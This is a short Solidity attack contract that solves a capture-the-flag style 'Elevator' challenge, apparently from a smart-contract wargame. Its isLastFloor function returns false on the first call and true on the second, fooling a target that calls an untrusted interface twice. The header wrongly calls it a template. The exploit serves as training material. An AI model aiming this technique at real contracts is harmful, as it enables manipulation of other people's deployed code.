pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IElevatorChallenge {
    function goTo(uint _floor) external;
}

contract ElevatorAttacker {
    bool public called = false;
    IElevatorChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IElevatorChallenge(challengeAddress);
    }

    function attack() external {
        challenge.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        // This function is called twice by the target contract
        // In order to get what we want, this function should first
        // return false, then return true the second time.
        if (called) {
            return true;
        }
        called = true;
        return false;
    }
}
